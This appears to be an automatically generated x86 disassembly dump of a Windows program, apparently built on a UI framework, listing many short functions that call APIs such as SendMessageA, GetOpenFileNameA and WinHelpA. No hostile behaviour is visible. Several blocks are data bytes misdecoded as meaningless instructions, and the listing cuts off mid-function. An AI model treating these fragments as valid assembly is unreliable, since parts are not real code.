sub_426f78
pop ebp
retn
sub_426f7c
sub [ rw-data ] 0x1
retn
sub_427420
jmp r-xdata
sub_427422
0x38ffe9ff 0x427c
sub_427872
jmp sub_4036f8
sub_427877
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45cc50
call sub_403a60
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427894
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42789c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403454
pop esi
retn
sub_4278b4
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403454
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4278cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_427975
jmp sub_4039ac
sub_4279a3
jmp sub_4039ac
sub_4279aa
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4279b4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4279c8
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_427c60
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_427c80
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_427ca0
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_427cf2
jmp sub_4039ac
sub_427cf9
pop ecx
pop ebp
retn
sub_428041
jmp sub_4039ac
sub_428048
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428181
jmp sub_4039ac
sub_428188
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428247
jmp sub_4039ac
sub_42824e
pop ebx
mov esp ebp
pop ebp
retn
sub_428300
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_428368
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_427d90
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_428380
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_4285e6
jmp sub_4039ac
sub_4285ed
pop ebp
retn
sub_42a11c
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42a315
jmp sub_4039ac
sub_42a31c
pop ebx
mov esp ebp
pop ebp
retn
sub_42a428
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_42a498
sub_42a440
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42a450
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_42a498
sub_42a468
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_42a498
sub_42a480
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_42a498
sub_42a6ea
jmp sub_4036f8
sub_42a7a3
jmp sub_4039ac
sub_42a7aa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a7b0
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42a724
sub_42a7c0
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42a724
sub_42a7d0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42a724
pop ebp
retn 0x8
sub_42a7e8
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42a914
push ebx
mov ebx eax
mov eax ebx
call sub_442ce0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42a928
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42a95c
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42aa60
jmp sub_4039ac
sub_42aa67
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac0a
jmp sub_4039ac
sub_42ac11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac1b
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ac30
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_43ffc8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ac68
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_43ffc8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ac84
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_43ffc8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42aca0
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_440ca8
sub_42acb4
mov al [ eax + 0x220 ]
retn
sub_42ae1d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_42ae35
jmp sub_4039ac
sub_42b141
jmp sub_4036f8
sub_42b2b4
retn
sub_42b441
jmp sub_4039ac
sub_42b4c4
push ebx
mov ebx eax
mov eax ebx
call sub_43efdc
mov eax ebx
call sub_42b2b8
pop ebx
retn
sub_42b4d8
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_43f6fc
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_42b600
pop ebx
retn
sub_42b5f0
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42b6c9
jmp sub_4039ac
sub_42b6d0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b718
push ebx
mov ebx eax
mov eax ebx
call sub_442c64
mov eax ebx
call sub_42b2b8
pop ebx
retn
sub_42b72c
push ebx
mov ebx eax
mov eax ebx
call sub_433750
mov eax ebx
call sub_42b2b8
pop ebx
retn
sub_42b740
mov al 0x1
retn
sub_42b744
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42ba7c
jmp sub_4039ac
sub_42ba83
pop ebp
retn
sub_42ba88
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d30
mov eax [ r-xdata ]
call sub_413780
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
sub_42badd
jmp sub_4039ac
sub_42bae4
pop ebp
retn
sub_42bae8
sub [ rw-data ] 0x1
retn
sub_42bb21
jmp sub_4039ac
sub_42bb28
pop ebp
retn
sub_42bb2c
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42bba8
retn
sub_42bba9
jmp sub_4039ac
j_sub_42bba8
jmp sub_42bba8
sub_42bbb0
pop ebp
retn
sub_42bbb4
sub [ rw-data ] 0x1
retn
sub_42bd71
retn
sub_42bda0
test al 0xc9
inc ebx
add [ ecx + ecx * 8 ] cl
inc ebx
add [ edx + edx * 8 ] dh
inc ebx
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_42c5fc
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_42cd7f
jmp sub_4039ac
sub_42cdbb
jmp sub_4039ac
sub_42d9c6
jmp sub_4039ac
sub_42d9cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dc54
call sub_43e45c
retn
sub_42dc5c
push ebx
mov ebx eax
mov eax ebx
call sub_42dc78
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_42dc70
mov eax [ r-xdata ]
retn
sub_42dc78
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_42dc84
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_42c76c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_42dc9c
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_42dcd4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42dd84
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dda0
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_42dcdc
sub_42ddb4
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ddd0
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42ddf0
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42de48
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_42dcdc
sub_42de5c
push esi
mov esi eax
mov eax esi
call sub_43e60c
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403454
sub_42dfa9
jmp sub_4039ac
sub_42dfb0
pop edi
pop esi
pop ecx
pop ebp
retn
sub_42dfb8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42dfc0
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42dfc8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_42c6f8
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_42c80c
pop esi
pop ebx
retn
sub_42e1f8
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403258
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42e2bc
jmp sub_4039ac
sub_42e2c3
pop ebp
retn
sub_42e2c8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42e214
call sub_403d7c
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c64
sub_42e8ad
jmp sub_4039ac
sub_42e95c
push ebx
mov ebx eax
mov eax ebx
call sub_404468
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_42eab0
jmp sub_4036f8
sub_42eb4c
jmp sub_4039ac
sub_42eb53
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42eb5c
call sub_4279b4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d7a0
retn
sub_42ec48
jmp sub_4039ac
sub_42ec4f
pop ebx
mov esp ebp
pop ebp
retn
sub_42ec54
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_428368
retn
sub_42eed2
jmp sub_4039ac
sub_42eed9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eef6
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
sub_42eeef
jmp sub_4039ac
sub_42eef6
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ef32
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_4594b8
sub_42ef8f
jmp sub_4039ac
sub_42ef96
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_42efc1
jmp sub_4039ac
sub_42efc8
pop ebp
retn
sub_42efcc
sub [ rw-data ] 0x1
retn
sub_42f028
jmp sub_4039ac
sub_42f02f
pop ebp
retn
sub_42f034
sub [ rw-data ] 0x1
retn
sub_42f090
jmp sub_4039ac
sub_42f097
pop ebp
retn
sub_42f09c
sub [ rw-data ] 0x1
retn
sub_42f0fd
jmp sub_4039ac
sub_42f104
pop ebp
retn
sub_42f108
sub [ rw-data ] 0x1
retn
sub_42f154
jmp sub_4039ac
sub_42f15b
pop ebp
retn
sub_42f160
sub [ rw-data ] 0x1
retn
sub_42f18d
jmp sub_4039ac
sub_42f194
pop ebp
retn
sub_42f198
sub [ rw-data ] 0x1
retn
sub_42f240
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bf48
mov [ rw-data ] eax
sub_42f275
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42f28c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42f30f
jmp sub_4039ac
sub_42f316
pop ebp
retn
sub_42f318
sub [ rw-data ] 0x1
retn
sub_42f387
jmp [ edi ]
sub_42f628
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42f640
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42f684
push ebx
mov ebx eax
mov eax ebx
call sub_42fee0
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42fecf
jmp sub_4039ac
sub_42fee0
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_426cb8
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42f654
sub_42ff37
jmp sub_4039ac
sub_42ff3e
pop ebp
retn
sub_42ff40
sub [ rw-data ] 0x1
retn
sub_430366
adc eax [ ecx ]
insb
add [ eax ] eax
[ eax + 0x3b ]
sub_433118
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_4332cb
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x2d49172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_433686
jmp sub_4039ac
sub_43368d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433712
jmp sub_4039ac
sub_433719
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433720
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43ffc8
pop ebx
retn
sub_433734
push ebx
mov ebx eax
mov eax ebx
call sub_442d20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43ffc8
pop ebx
retn
sub_433750
push ebx
mov ebx eax
mov eax ebx
call sub_441cf4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4337fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cf20
pop esi
pop ebx
retn
sub_433966
jmp sub_4039ac
sub_43396d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433a7c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43efdc
mov eax ebx
mov si 0xffc7
call sub_403454
pop esi
pop ebx
retn
sub_433b68
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433b84
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403454
sub_433ba0
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_433bac
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419afc
sub_433bc0
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433c20
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433c94
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403454
pop esi
pop ebx
retn
sub_433cb0
push esi
mov esi eax
mov eax esi
call sub_43eae8
mov eax esi
mov si 0xffc7
call sub_403454
pop esi
retn
sub_433d55
jmp sub_4039ac
sub_433d5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433d64
push ebx
mov ebx eax
mov eax ebx
call sub_43ec4c
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_433d88
push ebx
mov ebx eax
mov eax ebx
call sub_43ec64
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_433e5e
jmp sub_4039ac
sub_433f08
mov eax [ r-xdata ]
retn
sub_433f10
xor eax eax
retn
sub_433f34
retn
sub_43404c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_440ca8
sub_4340c4
push ebx
mov ebx eax
mov eax ebx
call sub_453eac
test eax eax
je r-xdata
mov eax ebx
call sub_43e45c
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_4340e8
xor eax eax
retn
sub_4341af
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3af9173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_4341c8
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403454
sub_4342b9
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_4342c2
jmp sub_4039ac
j_sub_4342b9
jmp sub_4342b9
sub_4342c9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434474
push ebx
mov ebx eax
mov eax ebx
call sub_43cb2c
mov eax ebx
call sub_43e45c
pop ebx
retn
sub_434488
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_434494
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_440ca8
sub_4344a8
test dl dl
je r-xdata
xor edx edx
call sub_4344bc
retn
mov dl 0x1
call sub_4344bc
retn
sub_434598
push ebx
mov ebx eax
mov eax ebx
call sub_441cf4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4345ac
call sub_440ca8
retn
sub_434642
jmp sub_4039ac
sub_434649
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434650
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_4346c0
mov al [ eax + 0x211 ]
retn
sub_4346f4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_440ca8
sub_4348d4
call sub_440ca8
retn
sub_434951
jmp sub_4039ac
sub_434958
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434990
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_434a70
jmp sub_4039ac
sub_434a77
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434b03
jmp sub_4039ac
sub_434b0a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434c49
jmp sub_4039ac
sub_434c50
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434ce5
jmp sub_4039ac
sub_434cec
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_434cf4
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403454
pop esi
retn
sub_434e32
jmp sub_4039ac
sub_434e54
jmp sub_4039ac
sub_434e5b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434e64
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403454
pop esi
retn
sub_434fce
jmp sub_4039ac
sub_434feb
jmp sub_4039ac
sub_434ff2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435195
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_4351a3
jmp sub_4039ac
j_sub_435195
jmp sub_435195
sub_4351aa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4351f8
push esi
mov si 0xffb1
call sub_403454
pop esi
retn
sub_435204
push esi
mov si 0xffb0
call sub_403454
pop esi
retn
sub_435258
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_4353c3
jmp sub_4039ac
sub_4353ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435514
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_435538
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_4355a0
cmp dl [ eax + 0x23b ]
je r-xdata
retn
mov [ eax + 0x23b ] dl
call sub_440ca8
sub_435620
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_440ca8
sub_435638
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_440ca8
sub_435654
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_440ca8
sub_435768
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_440ca8
sub_4357c8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_43588c
jmp sub_4039ac
sub_435893
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43592e
jmp sub_4039ac
sub_435935
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43593c
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_440ca8
sub_435f78
push ebx
mov ebx eax
mov eax ebx
call sub_441cf4
mov eax ebx
call sub_435440
pop ebx
retn
sub_4360f8
jmp sub_4039ac
sub_4360ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_436108
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_43651c
jmp sub_4039ac
sub_436523
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436600
jmp sub_4039ac
sub_436607
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436610
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_43667c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x193
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_4366e9
jmp sub_4039ac
sub_4366f0
pop ebp
retn
sub_4366f4
sub [ rw-data ] 0x1
retn
sub_436851
jmp sub_4039ac
sub_436858
pop ebp
retn
sub_43685c
sub [ rw-data ] 0x1
retn
sub_436864
push esi
inc edi
add al bh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_4370dc
sub_436875
add eax 0xffffffe0
jmp sub_436e5c
sub_43687d
add eax 0xffffffe0
jmp sub_436ec4
sub_436885
add eax 0xffffffe0
jmp sub_436fd8
sub_43688d
add eax 0xffffffe0
jmp sub_43704c
sub_436895
add eax 0xffffffe0
jmp sub_436b08
sub_43689d
add eax 0xffffffe0
jmp sub_436b1c
sub_4368a5
add eax 0xffffffe0
jmp sub_436b94
sub_4368bd
add eax 0xffffffe0
jmp sub_436cc4
sub_4368c5
add eax 0xffffffe0
jmp sub_436e0c
sub_4368cd
add eax 0xffffffe0
jmp sub_436e10
sub_4368d5
add eax 0xffffffe0
jmp sub_436e2c
sub_4368e7
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405798
sub_4368f1
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4057ac
sub_436ac5
jmp sub_4039ac
sub_436acc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436b08
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403ffc
pop ebx
retn
sub_436b83
jmp sub_4039ac
sub_436b8a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436c1c
jmp sub_4039ac
sub_436c23
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436cb7
jmp sub_4039ac
sub_436cbe
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436dbc
jmp sub_4039ac
sub_436dc3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436e0c
mov [ eax + 0xc ] edx
retn
sub_436e10
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_436eb4
jmp sub_4039ac
sub_436ebb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436fba
jmp sub_4039ac
sub_436fc1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43703a
jmp sub_4039ac
sub_437041
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4370cc
jmp sub_4039ac
sub_4370d3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4371c7
jmp sub_4039ac
sub_4371ce
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_437290
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_4371dc
call EnumWindows
retn
sub_437322
jmp sub_4039ac
sub_437329
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_437334
xor eax eax
retn
sub_43742d
jmp sub_4039ac
sub_437434
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43751e
jmp sub_4039ac
sub_437525
pop ebp
retn
sub_43757a
jmp sub_4039ac
sub_437581
pop ebp
retn
sub_438616
inc ebx
add [ esp ] cl
inc ebx
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_438654
test al 0xc9
inc ebx
add [ ecx + ecx * 8 ] cl
inc ebx
add [ edx + edx * 8 ] dh
inc ebx
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_4397c5
add eax 0xffffff8c
jmp sub_445d74
sub_4397cd
add eax 0xffffff8c
